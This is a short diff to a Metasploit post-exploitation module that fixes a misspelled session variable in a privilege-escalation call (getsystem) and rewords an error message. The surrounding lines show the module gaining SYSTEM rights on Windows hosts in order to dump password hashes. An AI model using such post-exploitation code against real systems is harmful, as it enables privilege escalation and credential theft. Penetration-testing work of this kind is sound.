@@ -433,7 +433,7 @@ class Metasploit3 < Msf::Post
 				elsif sysinfo['OS'] =~ /(Windows 7|2008|Vista)/i
 					if migrate_system
 						print_status("Trying to get SYSTEM Privilege")
-						results = sesion.priv.getsystem
+						results = session.priv.getsystem
 						if results[0]
 							print_good("Got SYSTEM Privelege")
 							read_hashdump.each_line do |h|
@@ -442,7 +442,7 @@ class Metasploit3 < Msf::Post
 						end
 					else
 						print_error("On this version of Windows you need to be NT AUTHORITY\\SYSTEM to dump the hashes")
-						print_error("Try the -s option.")
+						print_error("Try setting GETSYSTEM to true.")
 					end
 
 				else
